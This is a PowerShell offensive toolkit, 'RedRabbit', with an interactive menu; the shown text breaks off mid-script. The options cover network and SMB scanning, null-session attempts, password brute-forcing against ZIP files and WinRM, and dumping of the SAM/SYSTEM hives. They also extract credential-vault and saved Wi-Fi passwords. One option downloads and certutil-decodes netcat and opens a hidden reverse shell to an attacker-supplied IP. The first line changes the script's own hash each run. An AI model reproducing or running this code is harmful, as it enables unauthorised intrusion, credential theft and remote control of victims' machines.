Get-Random -Maximum 9999999 | Out-File -Append ($PSScriptRoot + "\" + $MyInvocation.MyCommand.Name)

$l1 = @('               
                                                                                           /|      __
    ██▀███  ▓█████ ▓█████▄  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄    ██▓▄▄▄█████▓               / |    /  /
 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██ ▒ ██▒▒████▄    ▓█████▄ ▓█████▄ ▓██▒▓  ██▒ ▓▒                Y  |  //  /
 ▓██ ░▄█ ▒▒███   ░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒██▒▒ ▓██░ ▒░                |  | /( .^   
 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ░██░░ ▓██▓ ░                 >-"~"-v"
 ░██▓ ▒██▒░▒████▒░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░██░  ▒██▒ ░               /       Y
 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░▓    ▒ ░░                / X <    |
 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ▒ ░    ░                  ( ~T~     j
  ░░   ░    ░    ░ ░  ░   ░░   ░   ░   ▒    ░    ░  ░    ░  ▒ ░  ░                    >._-'' _./
   ░        ░  ░   ░       ░           ░  ░ ░       ░       ░                       /   "~"  |
                 ░                               ░       ░                          Y     _,  |
                                                                                   /| ;-"~ _  l
                                                                                 / l/ ,-"~    \
   Creator: https://xstag0.com / @xstag0                                         \//\/      .- \
                                                                                   l  RR! /    Y 
                                                                                   /      I     !
                                                                                   \      _\    /"\
                                                                                 (" ~----( ~   Y.  ))')


$l1; 


# Section 1

$h = hostname
$u = $env:UserName
$d = (Get-CimInstance Win32_ComputerSystem).Domain

$sesh = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)


if ($sesh -eq "True"){

    $sessionadmin = "Admin Session"
    $tc = "Green"

    } else {

           $sessionadmin = "User Session"
           $tc = "Red"

           }



if ($d -eq "WORKGROUP"){

    $dom = "WORKGROUP" 
    $dtc = "Red"
    
    } else {

            $a = net group "domain admins" /domain

            $idom = select-string -pattern "$u" -InputObject $a

            if ($idom -eq $null){
            
                                  $dom =  "False"
                                  $dtc = "Red"
                                    
                                    } else {
                                    
                                            $dom = "True"
                                            $dtc = "Green"
                                            
                                            }

}


Write-Host " Current User: $u     |  Current Machine: $h"

Write-Host " Session: " -NoNewline ; Write-Host "$sessionadmin " -ForegroundColor $tc -NoNewline ; Write-Host "  |  Domain Admin: " -NoNewline ; Write-Host "$dom" -ForegroundColor $dtc

Write-Host ""


while($true){ 


$option = Read-Host -Prompt "[RedRabbit]:"


if ($option -eq "exit"){ exit }



    if ($option -eq "h" -or $option -eq "help"){


    $help = ('
    
         Please enter one of the following numbers | Options with * require admin
                            
                           Enter "CH" for cloud options
                           Enter "exit" to end RedRabbit   
                              
             
                           
    Option 1: Quick Recon                               Option 10: Encode / Decode Commands (Base64)
    Option 2: Subnet Scanner                          * Option 11: Query DLLs
    Option 3: SMB Scanner                               Option 12: Reverse Shell (Netcat)
    Option 4: Network Scanner                           Option 13: Scan Socials For Usernames
    Option 5: NetBios Scanner                           Option 14: Flood Powershell Event Logs 
   
   
    Option 6: DNS Resolver                              Option 15: PassVol Search
    Option 7: Brute Force ZIP                           Option 16: File / Web Crawler
    Option 8: Brute Force WinRM                         Option 17: KeyLogger
    Option 9: Password Extraction                       Option 18: Clipboard Logger
                                                        
    
                            ---------------------------------


    Option 19: Scan Gateway                             Option 23: Bad LAPS 
    Option 20: Find SPNs (KerbRoast)
    Option 21: Pulse
    Option 22: LDAP AD Scan


                            -----------------* Browsers *----------------

    Option br-1: Show History
                           
    ')

    $help

    } # End Of Help


    if ($option -eq "ch" -or $option -eq "cloud options"){


    $cloudhelp = ('
    
                     Please enter one of the following numbers
                            
                           Enter "exit" to end RedRabbit   
                              

                                    Azure AD   
                                           
                       * Requires Azure-AD and AZAD Modules


                           
    Option AzAD1: Show AZAD Tenant Details
    Option AzAD2: Show AZAD Admin Roles



                                   Azure Cloud

                             * Requires AZ Module


    Option Az1: Pull Azure Keys
    Option Az2: User Adminstrators (Self-Elevate)
    
                            
                           
    ')

    $cloudhelp

    } # End Of Cloud Options


   
    if ($option -eq "1"){
    

    $user = whoami
    $currenthost = hostname 
    $networkinfo = (Get-NetIPAddress).IPAddress
    $Publicip = (Invoke-WebRequest http://ipinfo.io/ip).content
    $org = (Get-CimInstance Win32_OperatingSystem).Organization


    Write-Output ""

    Write-Host " User: $user"
    Write-Host " Hostname: $currenthost"
    Write-Host " Public IP: " -NoNewline; Write-Host $Publicip
    write-host " Organization: $org"


    Write-Output ""

    Write-Host " [*] Getting AntiVirus ... "
    Start-Sleep -Seconds 2

    try {
    
        Get-CimInstance -Namespace root/securitycenter2 -ClassName antivirusproduct | Select-Object displayName | Format-Table -HideTableHeaders
    
        } catch{
        
        write-host "Failed To Get AntiVirus" -ForegroundColor Red

                }

    Write-Output ""

    Write-Host " [*] Getting Network IP/s ..."
    Start-Sleep -Seconds 2
   
    Write-Output ""

    $networkinfo

    Write-Output ""

        
    $lad = @(Get-CimInstance win32_useraccount | Select-Object name,sid)

        foreach ($l in $lad){
        
          [string]$sid = $l.sid

            if ($sid.EndsWith("500")){

            $ladstatus = (Get-CimInstance win32_useraccount | Where-Object {$_.name -like $l.name}).Disabled 

            if ($ladstatus -eq "True"){
                
                $c = "Red"
            
                } else {

                    $c = "Green"
                
                     }
            
            Write-Host " [*] Getting Local Admin ..."
            Start-Sleep -Seconds 2

            Write-Host " Local Admin Found: " -NoNewline ; Write-Host $l.name -ForegroundColor Green -NoNewline ; Write-Host " | isDisabled: " -NoNewline ; Write-Host $ladstatus -ForegroundColor $c           
            
            
          }
      
        }


        Write-Output ""

        Write-Host " [*] Getting Current Logged In Users ... "
        Start-Sleep -Seconds 2

        Write-Output ""

            query user /server:$SERVER 

        Write-Output ""

        Write-Host " [*] Getting Program Directories ... "
        Start-Sleep -Seconds 2

        $allprogs = @()
        $progs = @((get-childitem "c:\program files").Name)
        $progs32 = @((get-childitem "c:\Program Files (x86)").Name)
        $allprogs += $progs ; $allprogs += $progs32
        

        Write-Output ""

            foreach ($pn in $allprogs){
            
                if ($pn -notlike "*Windows*" -and $pn -notlike "*Microsoft*"){
                    
                    Write-Host $pn -ForegroundColor Green
                
                    } else {
                            
                            Write-Host $pn

                            }

            
                }

            

        Write-Output ""

        Write-Host " [*] Getting SMB Shares ... "
        Start-Sleep -Seconds 2

        Write-Output ""

            Get-SmbShare | Format-Table -HideTableHeaders

        Write-Output ""

        Write-Host " [*] Getting " -NoNewline ; Write-Host "Blocked" -ForegroundColor Red -NoNewline ; Write-Host " Firewall Rules...."

        Write-Output ""

            Get-NetFirewallRule | Where-Object Action -eq "Block" | Format-Table DisplayName,Enabled,Profile,Direction,Action,Name

        Write-Output ""


   } # End Option 1

   
    
    if ($option -eq "2"){
    
    
    $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop
    $manyips = $subnet.Length


    if($manyips -eq 2){
    
        $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop[1]
        
        
            }
   
        
    $subnetrange = $subnet.Substring(0,$subnet.IndexOf('.') + 1 + $subnet.Substring($subnet.IndexOf('.') + 1).IndexOf('.') + 3)

    $isdot = $subnetrange.EndsWith('.')



    if ($isdot -like "False"){
    
            $subnetrange = $subnetrange + '.'
            
                }

    
    $iprange = @(1..254)

    Write-Output ""
    Write-Host " [*] Current Network: $subnet"

    Write-Host " [*] Scanning: " -NoNewline ; Write-Host $subnetrange -NoNewline;  Write-Host "0/24" -ForegroundColor Red

    Write-Output ""

    




    foreach ($i in $iprange){


    $currentip = $subnetrange + $i

    $islive = test-connection $currentip -Quiet -Count 1


        if ($islive -eq "True"){

            try{$dnstest = (Resolve-DnsName $currentip -ErrorAction SilentlyContinue).NameHost}catch{}


                if ($dnstest -like "*.home") {

                    $dnstest = $dnstest -replace ".home",""

                        }

    Write-Output ""

    Write-Host " Host is Reachable: " -NoNewline  ; Write-Host $currentIP -ForegroundColor Green -NoNewline ; Write-Host "  |   DNS: $dnstest"


    $portstoscan = @(20,21,22,23,25,50,51,53,80,110,119,135,136,137,138,139,143,161,162,389,443,445,636,1025,1443,3389,5985,5986,8080,10000)
    $waittime = 100

    foreach ($p in $portstoscan){

    $TCPObject = new-Object system.Net.Sockets.TcpClient

            try{$result = $TCPObject.ConnectAsync($currentip,$p).Wait($waittime)}catch{}

            if ($result -eq "True"){
    
                    Write-Host " Port Open: " -NoNewline  ; Write-Host $p -ForegroundColor Green
    
                    }

            }

            Write-Output ""

    } else {

            Write-Host " Failed To Scan $currentip" -ForegroundColor Red
        
            }

        }
    
    } # End of option 2



    if ($option -eq "3"){


    $listsmb = @()
    

    $lops = @('
    
      List Of Options:

        1: Single Host
        2: Current Subnet
        3: Multiple Hosts (Requires txt file)
    
    
    ')

    $lops

    $op = Read-Host " [Option]:"

    Write-Output ""

    if ($op -eq "1"){
    
        $sh = Read-Host -Prompt " [Single Host]:"

        Write-Output ""



        try { 
                $TCPObject = new-Object system.Net.Sockets.TcpClient
                $result = $TCPObject.ConnectAsync($sh,445).Wait(100)
                
                
                } catch { }


                if ($result -eq "True"){
                    
                    Write-Host " SMB Host Found: " -NoNewline ; Write-Host $sh -NoNewline -ForegroundColor Green ; Write-Host " Adding To List....."
                    $listsmb += $sh
    
                        } else {
                        
                                Write-Host " SMB Port Closed On: $sh" -ForegroundColor Red

                        
                                }



        
    }


    if ($op -eq "2"){

        
        $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop
        $manyips = $subnet.Length


    if($manyips -eq 2){
    
        $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop[1]
        
        
            }
   
        
        $subnetrange = $subnet.Substring(0,$subnet.IndexOf('.') + 1 + $subnet.Substring($subnet.IndexOf('.') + 1).IndexOf('.') + 3)

        $isdot = $subnetrange.EndsWith('.')



    if ($isdot -like "False"){
    
            $subnetrange = $subnetrange + '.'
            
                }

    Write-Host " [*] Getting Subnet ..."

    Write-Host " [*] Subnet: " -NoNewline ; Write-Host $subnetrange -NoNewline ; Write-Host "0/24"

    
    $iprange = @(1..254)

        
    Write-Host " [*] Scanning For Live Hosts.... "   
    
    Write-Output ""

    foreach ($lip in $iprange){
        
        $cip = $subnetrange + $lip
        
        
        
            try { 

                $TCPObject = new-Object system.Net.Sockets.TcpClient
                $result = $TCPObject.ConnectAsync($cip,445).Wait(100)
                
                
               } catch { }

                
                if ($result -eq "True"){

                                      
                    Write-Host " SMB Host Found: " -NoNewline ; Write-Host $cip -NoNewline -ForegroundColor Green ; Write-Host " Adding To List....."
                    $listsmb += $cip
    
                        }

            }


        
              

        }

    

    if ($op -eq "3"){
    
    
    $tf = Read-Host -Prompt " [File Location]:"

    Write-Output ""


    $tp = Test-Path -Path $tf


        if ($tp -eq "True" -and $tf.EndsWith(".txt")){
    
        $tcon = @(Get-Content -Path $tf)

        Write-Host " [*] Collecting Hosts From List..."
        Write-Host " [*] Number of Hosts Collected: " -NoNewline ; Write-Host $tcon.Count -ForegroundColor Green
        Write-Host " [*] Scanning For Live Hosts.... "

        Write-Output ""

    
        foreach ($tip in $tcon){
        
                
        
            try { 
            
                $result = $TCPObject.ConnectAsync($tip,445).Wait(100)
                
                
                } catch { }


                if ($result -eq "True"){
                    
                    Write-Host " SMB Host Found: " -NoNewline ; Write-Host $tip -NoNewline -ForegroundColor Green ; Write-Host " Adding To List....."
                    $listsmb += $tip
    
                        } else {
                        
                            Write-Host " SMB Port Closed On: $tip" -ForegroundColor Red
                        
                         }

       

            }

  
         }

            else {
         
                Write-Host " File Not Found... Exiting " -ForegroundColor Red
         
                }
    
    
    
    }


    if (($listsmb.Count) -ne 0){
     
        foreach ($i in $listsmb){
        
        Write-Output ""

        Write-Host " [*] Starting SMB Scan ..."

        Write-Output ""
        Write-Host " Scanning: " -NoNewline ; Write-Host $i -ForegroundColor Green

        Write-Output ""
    

        $shrs = @(net view \\$i /all | select -Skip 7 | ?{$_ -match 'disk*'} | %{$_ -match '^(.+?)\s+Disk*'|out-null;$matches[1]})
     
        Write-Host " [*] Shares Found: " -NoNewline ; Write-Host $shrs.Count -ForegroundColor Green

            foreach ($shr in $shrs){

            Write-Host " [*] Probing: \\$i\$shr"
     
            $probe = Test-Path "\\$i\$shr" -ErrorAction SilentlyContinue

                if ($probe -eq $true){
     
                Get-ChildItem "\\$i\$shr" -ErrorAction SilentlyContinue
                
                   

                }

     
            }
    
    
        }


    }
    
    
    
    
    Write-Output ""
    
    
    
    } # End Of Option 3



    if ($option -eq "4"){
    
    
    $ScanAll = "" 
    $waittime = 400
    $liveports = @()   
    $destip = @()           
    $Portarray = @(20,21,22,23,25,50,51,53,80,110,119,135,136,137,138,139,143,161,162,389,443,445,636,1025,1443,3389,5985,5986,8080,10000)

     
    $scanoptions = @('
               
          Enter One Of The Following: 

            * Enter An IP Address
            * Enter A Hostname (DNS)
            * Enter A IP List Location (Only TXT Files Supported)
    
    ')

    $scanoptions
    
    [string]$Typeofscan = Read-Host -Prompt " [Target/s]:"
  

        if (($Typeofscan).EndsWith(".txt")) {
    
        $PulledIPs = Get-Content $Typeofscan
    
            foreach ($i in $PulledIPs) {
  
            $destip += $i

                
            } 

        } else {
    
             $destip += $Typeofscan
    
                }
    
    write-output ""

    Write-Host " [*] Hosts To Scan: " -NoNewline ; Write-Host $destip.count -ForegroundColor Green

    $portopts = @('
    
        Scanning Options: 

            1. Common Scan
            2. Full Scan (1-65535)
            3. Quick Full Scan (Less Accurate)
    
    
    ')

    $portopts


    $ScanPorts = Read-Host -Prompt " [Scanning Option]:" 

        if ($ScanPorts -eq 1) {$ScanAll = ""}
        if ($ScanPorts -eq 2) {$ScanAll = "True"}
        if ($ScanPorts -eq 3) {$ScanAll = "Quick"}
        if ($ScanPorts -ne 1 -AND $ScanPorts -ne 2 -AND $ScanPorts -ne 3){exit}

        Write-Output ""
 
            if ($ScanAll -eq "True") {

            $waittime = 400
            $Portarray = 1..65535 

            Write-Host " [*] All Ports Selected"
    
            }

            if ($ScanAll -eq "Quick") {

            $waittime = 40
            $Portarray = 1..65535

            Write-Host " [*] Quick Scan Selected"

            }

                else {
    
                Write-Host " [*] Common Scan Selected"

                }



    

    
    Write-Output ""
    Write-Host " [*] Hosts to Scan: " -NoNewline ; Write-Host $destip.Count -ForegroundColor Green
    Write-Host " [*] Starting Scan ..."
    

        foreach ($i in $destip){

            Write-Host " [*] Scanning: $i ..."


            foreach ($p in $Portarray){


            $TCPObject = new-Object system.Net.Sockets.TcpClient

           
            try { 
            
            
                $Result = $TCPObject.ConnectAsync($i,$p).Wait($waittime)
                     
            
                } catch { 
                
                    
                
                        }


                if ($Result -eq "True") {
    
                $liveports += $p  

                }


            } # For each Array

                
                if ($liveports.Count -eq 0) {

                            Write-Output ""

                            Write-Host "    Failed To Scan : $i" -ForegroundColor Red

                          } else {
    

                                Write-Output ""
                                Write-Host "   Target: " -NoNewline ; Write-Host $i -ForegroundColor Green

                                Write-Output ""

                                Write-Host "    Scan Result: "

                                Write-Output ""

                                       foreach ($pff in $liveports){
           
                                        Write-Host "    Port: " -NoNewline ; Write-Host $pff -ForegroundColor Green
           
                                           }



                               }


    Write-Output ""
    

    #Clear Array for next

    $liveports = @()

    

    } # For Each $i in DestIP


    
    
    
    
    } # End of Option 4



    if ($option -eq "5"){
    
       $destip = @()           
     
    $scanoptions = @('
            
          Enter One Of The Following: 

            * Enter An IP Address
            * Enter A Hostname (DNS)
            * Enter A IP List (Only TXT Files Supported)
    
    ')

    $scanoptions
    
    [string]$Typeofscan = Read-Host -Prompt " [Target/s]:"
  

        if (($Typeofscan).EndsWith(".txt")) {
    
        $PulledIPs = Get-Content $Typeofscan
    
            foreach ($i in $PulledIPs) {
  
            $destip += $i

                
            } 

        } else {
    
             $destip += $Typeofscan
    
                }
    
    write-output ""

    Write-Host " [*] Hosts To Scan: " -NoNewline ; Write-Host $destip.count -ForegroundColor Green
    
    Write-Output ""
    Write-Output " [*] Starting Scan ..."

    

        foreach ($i in $destip){


            Write-Host " [*] Scanning: $i ..."

            $ntbios = @(137,138,139)
            $count = 0
            $waittime = 400

                foreach ($p in $ntbios){

                $TCPObject = new-Object system.Net.Sockets.TcpClient

                try{$result = $TCPObject.ConnectAsync($currentip,$p).Wait($waittime)}catch{}


                if ($result -ne "True"){
    
                    Write-Host " Host Not Reachable On Netbios ($p): " -NoNewline  ; Write-Host $i -ForegroundColor Red
    
                    } else {
                    
                                    if ($i -contains "."){
                        
                        $nts = "/A"
                
                        } else {
                        
                                $nts = "/a"
                        
                                }


                                 nbtstat $nts $i

                                 Write-Output ""

                                 Write-Host " [*] Attempting Null Session ..."

                                 Write-Output ""

                                 $nses = net use \\$i\IPC$ "" /user: 2>null

                                    if ($nses -eq $null) {
                
                                    Write-Host " Failed Null Session on $i" -ForegroundColor Red
                
                                
                                        } else {
                
                
                                            Write-Host " Null Session May Be Possible" -ForegroundColor Green
                
                
                                             }

                        }


                } 

         }

     
         Write-Output ""

    
    } # End of Option 5



    if ($option -eq "6"){
    

     $dnsts = @()
     $dnsopt = @('
    
        Resolving Options: 

            * Enter An IP Address
            * Enter A IP List Location (Only TXT Files Supported)
    
    
    ')

     $dnsopt

  
    
    [string]$dnso = Read-Host -Prompt " [Target/s]:"


    $dnsservo = @('
    
        DNS Server Option:

            1. Resolve Using Internal DNS
            2. Resolve Using External DNS (8.8.8.8)
    
    
    ')

     $dnsservo

     $dnsserv = Read-Host -Prompt " [DNS Server]:"

     Write-Output ""

     

        if ($dnso -like "*txt") {
    
        $dnsts += Get-Content $dnso

        } else {
            
                $dnsts += $dnso

                }

        Write-Host " [*] Starting Resolver ..."

        Write-Output ""


                    foreach ($dnsh in $dnsts){

                        if ($dnsserv -eq 1){
                        
                                $dnsres =  Resolve-DnsName $dnsh -erroraction SilentlyContinue
                        
                                } else {
                                    
                                        $dnsres =  Resolve-DnsName $dnsh -Server 8.8.8.8 -erroraction SilentlyContinue
                            
                                      }




                              if ($dnsres -eq $null){
                                
                                                Write-Host " Failed To Resolve: $dnsh" -ForegroundColor Red
                                
                                
                                                } else {
                                                
                                                    
                                                    Write-Host " Target:" -NoNewline ; Write-Host $dnsh -ForegroundColor Green
                                                    
                                                    $dnsres | Format-Table

                                                    Write-Output ""
                                                
                                                
                                                    }
                    
                       
                    
                            } 


                            Write-Output ""

    
    
    
    } # End of Option 6



    if ($option -eq "7"){
    
    
 $7z = "C:\Program Files\7-Zip\7z.exe"
 $testifinstalled = Test-Path "$7z"
 $Thepasswordis = $null

 Write-Host " [*] Checking If 7Zip is Installed ..."


    if ($testifinstalled -eq "True") {

    Write-Host " [*] 7Zip Installed " -ForegroundColor Green

    Write-Output ""

    $ziploc = Read-Host -Prompt " [Zip File Location]:"
    $Passwordlist = Read-Host -Prompt " [Word List Location]:"
    $passwords = @(Get-Content $Passwordlist)

    Write-Host " [*] Starting Brute Force ..."

        foreach ($i in $passwords){


            if ($Thepasswordis -eq $null){

               $brute = & 'C:\Program Files\7-Zip\7z.exe' e "$ziploc" -p"$i" -y


                    if ($brute -contains "Everything is Ok"){

                    $Thepasswordis = $i

                    
                    } else {
                    
                            Write-Host " Pasword: $i Failed" -ForegroundColor Red
                    
                    
                            }



                }

        } # Foreach Rule



 if ($Thepasswordis -eq "") {

 Write-Output ""

 Write-Host " Brute Force Attack Failed ..." -ForegroundColor Red


    }

        else {
         
          Write-Output ""
    
          Write-Host " The Password Is: " -NoNewline ; Write-Host $Thepasswordis -ForegroundColor Green


            }



    } 



    else {
    
    Write-Host " 7Zip Not Installed ..." -ForegroundColor Red

    Write-Output ""


    }
    

    
    
    
    
    } # End of Option 7



    if ($option -eq "8"){


    
 $targetcomputer = ""
 $targetuser = @()
 $targetpassword = @()

   Write-Host " [*] Prompting For Target Computer ..."

    $targetcomputer = Read-Host -Prompt " [Target]:"

    Write-Output ""


   Write-Host " [*] Scanning: $targetcomputer ..."

            $winrm = @(5985, 5986)
            $waittime = 400
            

                foreach ($prt in $winrm){

                                                
                $TCPObject = new-Object system.Net.Sockets.TcpClient

                try{$result = $TCPObject.ConnectAsync($targetcomputer,$prt).Wait($waittime)}catch{}


                    if ($result -ne "True"){
                    
                     Write-Host " Host Not Reachable On WinRm ($prt): " -NoNewline  ; Write-Host $targetcomputer -ForegroundColor Red

                    
                    } elseif ($result -eq "True"){

                    
                    Write-Host " [*] WinRM Reachable ..." -ForegroundColor Green

        $winrmoptions = @('
            
          Enter One Of The Following: 

            * Single Username
            * Multiple Users (Only TXT Files Supported)
            
    
    ')

    $winrmoptions
  
        
    [string]$useroption = Read-Host -Prompt " [Option]:"

  
      if ($useroption.EndsWith(".txt")){ 
        
        $targetuser = @(Get-Content -Path $useroption)
    

        }

        else {
        
             $targetuser += $useroption
        
        
         }

   Write-Host " [*] Users to Scan: " -NoNewline ; Write-Host $targetuser.count -ForegroundColor Green


  
  Write-Output ""
  
  Write-Host " [*] Prompting For Password Word List For Brute (.TXT) ..."
  

  $passloc = Read-Host -Prompt " [Word List Location]:"

  $targetpassword = @(Get-Content -Path $passloc)

  Write-Output ""

  Write-Host " [*] Details Collected, Starting Brute ..."

  Write-Output ""

        foreach ($u in $targetuser) {

        $hackedpassword = $null

            foreach ($p in $targetpassword){

                if ($hackedpassword -eq $null){
            
                $crackedcreds = @()


                 

                 $Error.clear()                
                 
  
                 $secpassword = ConvertTo-SecureString $p -AsPlainText -Force
                 $mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)

                 
                 $result = Test-WSMan -ComputerName $targetcomputer -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue


                        if ($result -eq $null) {

                            Write-Host "Failed Password: $p" -ForegroundColor Red
    
                            
                                     } else {

                    
                                     Write-Host "Password Found: " -NoNewline ; Write-Host $p -ForegroundColor Green
    
                                     $crackedcreds += $u + "::" + $p

                                     $hackedpassword = 1
    
        
                                        }

                  
                  } # while null


         } # foreach password



    } # foreach user


    Write-Output ""

        if ($crackedcreds -ne $null) {


        Write-Host " [*] Listing Cracked Credentials ..."

        Write-Output $crackedcreds

        Write-Output ""


        }

            else {

                Write-Host " Brute Force Failed ..." -ForegroundColor Red

                Write-Output ""

                }

          
                    
              } # End Of main loop

               else {
               
                #Scan next

               }



         } # End of Brute


         Write-Output ""
    
    
    } # End of Option 8


    if ($option -eq "9"){
    
    
    
   
    if ($sessionadmin -eq "Admin Session"){

    Write-Host " [*] Admin Session Running ..." -ForegroundColor Green
    Write-Host " [*] Prompting For Extraction Location ..."

    $exportloc = Read-Host -Prompt " [Folder Location]:"
    
        if ($exportloc.EndsWith("\") -eq $false){
        
                $exportloc = $exportloc + "\"
                
                
                }


    $sam = $exportloc + "sam"
    $sysl = $exportloc + "system"

    Write-Host " [*] Extracting SAM ..."
    Start-Sleep -Seconds 2

    reg save hklm\sam $sam

        if ((Test-Path -Path $sam) -eq "true"){
        
            Write-Host " [*] Extraction Of SAM: " -NoNewline ; Write-Host "Successful" -ForegroundColor Green
        
            } else {
            
                Write-Host " [*] Extraction Of SAM: " -NoNewline ; Write-Host "Failed" -ForegroundColor Red
            
                }

    Write-Host " [*] Extracting SYSTEM ..."
    Start-Sleep -Seconds 2

    reg save hklm\system $sysl

            if ((Test-Path -Path $sysl) -eq "true"){
        
            Write-Host " [*] Extraction Of SYSTEM: " -NoNewline ; Write-Host "Successful" -ForegroundColor Green
        
            } else {
            
                Write-Host " [*] Extraction Of SYSTEM: " -NoNewline ; Write-Host "Failed" -ForegroundColor Red
            
                }
    
    
    } else {
    
    
            Write-Output ""
            Write-Host " [*] Failed To Extract SAM/SYSTEM: Session Not Running As Admin ..." -ForegroundColor Red
            
            
            }


    Write-Output ""

    Write-Host " [*] Checking Credential Store ..."
    Start-Sleep -Seconds 2

    Write-Output ""


    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $a = @(New-Object Windows.Security.Credentials.PasswordVault)
    $a.RetrieveAll() | % { $_.RetrievePassword();$_ }

    Write-Output ""

    Write-Host " [*] Checking Saved Wireless Passwords ..."
    Start-Sleep -Seconds 2

    Write-Output ""

    $a = netsh wlan show profile | Select-String -Pattern "All User Profile"; $a = $a-replace "All User Profile","" -replace " :",""; $a = $a.trim()
   
    
        Foreach ($i in $a){

        $b = netsh wlan show profile $i key=clear | Select-String -Pattern "Key Content"

        $b = $b -replace "Key Content","" -replace " :",""

            try{
            
            $b = $b.trim()
            
            Write-Host "Network Name: $i | " -NoNewline ; Write-Host " Password: " -NoNewline ; Write-Host $b -ForegroundColor Green
            
            
            } catch { 

                    # Do nothing 

                     }


      }

      Write-Output ""

       
    
    
    } # End Of Option 9


    if ($option -eq "10"){


    
    $edo = @('
    
        Encoding Options:

            1. Encoding Text
            2. Decoding Text
    
    
    ')

     $edo

          $eop = Read-Host -Prompt " [Option]:"

          Write-Output ""

         if ($eop -eq 1){

         Write-Host " [*] Encoding Option Selected ..."

         $et = Read-Host -Prompt " [Text To Encode]:"
         
         Write-Host " [*] Encoding Text ..."
         Start-Sleep -Seconds 2

         $Bytes = [System.Text.Encoding]::Unicode.GetBytes($et)
         $EncodedText =[Convert]::ToBase64String($Bytes)
         
            if ($EncodedText -ne $null){
         
            Write-Host " Successfully Encoded Text: " -ForegroundColor Green

            Write-Output ""

            $EncodedText
            
            Write-Output ""

            Set-Clipboard $EncodedText

            Write-Host " [*] Copied To Clipboard ..."

            } else {
            
                   Write-Host "Failed To Encode ..." -ForegroundColor Red
                
                }
         
     
     
        } else {
                
                Write-Host " [*] Decoding Option Selected ..."

                $dt = Read-Host -Prompt " [Text To Decode]:"

                Write-Host " [*] Decoding Text ..."
                Start-Sleep -Seconds 2
               
                $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($dt))

                    if ($DecodedText -ne $null){

                        Write-Host " Successfully Decoded Text: " -ForegroundColor Green

                        Write-Output ""

                         $DecodedText

                         Write-Output ""
                         
                         Set-Clipboard $DecodedText

                         Write-Host " [*] Copied To Clipboard ..."

                    
                        } else {
                        
                          Write-Host "Failed To Decode ..." -ForegroundColor Red
                        
                        
                            }


        
               }



    
    
    
    
    } # End Of Option 10


    if ($option -eq "11"){
    
     

     if ($sessionadmin -ne "Admin Session"){
        
      Write-Host " Session Requires Admin ..." -ForegroundColor Red
        
      } else {  

      Write-Output ""

      Write-Host " [*] Tables Can Be Big, So Run so Maximize Window" -ForegroundColor Blue
            
   
   $edo = @('
    
        DLL Options:

            1. Query DLLs
            2. Show Missing DLLs (With Permission)
    
    
    ')

     $edo

     
    $dllo = Read-Host -Prompt " [Option]:"

    Write-Output ""

    Write-Host " [*] Running Query ... "

    Write-Output ""
            
              If ($dllo -eq "1"){

                Write-Host " [*] Prompting For Keyword (Use * To List All)"

                $q = Read-Host -Prompt " [Keyword]:"
    
                $a = @(Get-Process -IncludeUserName | Where-Object {$_.ProcessName -like "*$q*"} | Select-Object *)

                
                
                    foreach ($l in $a){

                    $b = @($l.Modules.FileName)


                       foreach ($m in $b){

                
                                $l | Select-Object name,path,username, {$m}

                                 }


                     }  


        } # Option 1

    
    If ($dllo -eq "2"){

    $a = @(Get-Process -IncludeUserName | Where-Object {$_.ProcessName -like "*"} | Select-Object *)

    $c = @()

    
        foreach ($l in $a){

            $b = @($l.Modules.FileName)

            
                foreach ($m in $b){

                    if ($m -ne $null){

                        if ((Test-Path $m) -eq $false){


                            $cp = (Get-Acl ($m -replace ($l.Modules | Where-Object {$_.FileName -eq $m}).ModuleName,"") -ErrorAction SilentlyContinue).Access.IdentityReference | Where-Object {$_ -match ($env:username)}

                                if ($cp -ne $null){
                                        
                                                                            
                                        $c += $l | Select-Object name,path,username, {$m}, "true"

                                        Write-Host " Found One: " -NoNewline ; Write-Host $m -ForegroundColor Green


                                        } #cp null


                            } # Test-path


                    } # Null check



                } # Foreach m in b


        }


    if ($c -ne $null){

    $c | Format-Table
    
    } else {
    
    Write-Host "No Missing DLLs Found" -ForegroundColor Red
    
        }
    

    }


}
    
    
    
    } # End Of Option 11


    if ($option -eq "12"){


        
    Write-Output ""

    Write-Host " [*] Download Encoded NetCat ..."
    
         if ((Test-Path $env:TEMP\nc.exe.txt) -ne $true -and (Test-Path $env:TEMP\nc.exe) -ne $true){

             Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
             certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe

             Write-Output ""

    }

    $downnet = Test-Path -Path $env:TEMP\nc.exe -ErrorAction SilentlyContinue

    if ($downnet -eq $true){

    Write-Host " [*] Downloaded NetCat ..." -ForegroundColor Green
    Write-Host " [*] Prompting For Details ..."

    $atk = Read-Host -Prompt " [Attackers IP]:"
    $port = Read-Host -Prompt " [Attackers Port]:"

    Write-Output ""
   
        $seshnc = (Get-Process powershell).count
   
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe $atk $port -e cmd.exe"

            $hasrannc = (Get-Process powershell).count

                if ($hasrannc -gt $seshnc){

